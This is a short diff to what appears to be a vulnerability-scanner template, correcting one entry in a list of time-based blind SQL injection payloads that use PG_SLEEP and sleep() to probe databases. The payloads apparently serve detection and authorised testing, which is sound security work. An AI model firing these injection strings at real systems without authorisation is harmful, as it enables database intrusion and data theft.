@@ -38,7 +38,7 @@ http:
           - ";SELECT PG_SLEEP([SLEEPTIME])--"
           - "\'+UNION+SELECT+sleep([SLEEPTIME])+#"
           - "\';SELECT PG_SLEEP([SLEEPTIME])--+"
-          - "\%2c(select*from(select(sleep([SLEEPTIME])))a)"
+          - "%2c(select*from(select(sleep([SLEEPTIME])))a)"
           - ";select+sleep([SLEEPTIME]);;#"
           - "if(now()=sysdate()%2Csleep([SLEEPTIME])%2C0)"
           - "if(now()=sysdate(),sleep([SLEEPTIME]),0)"
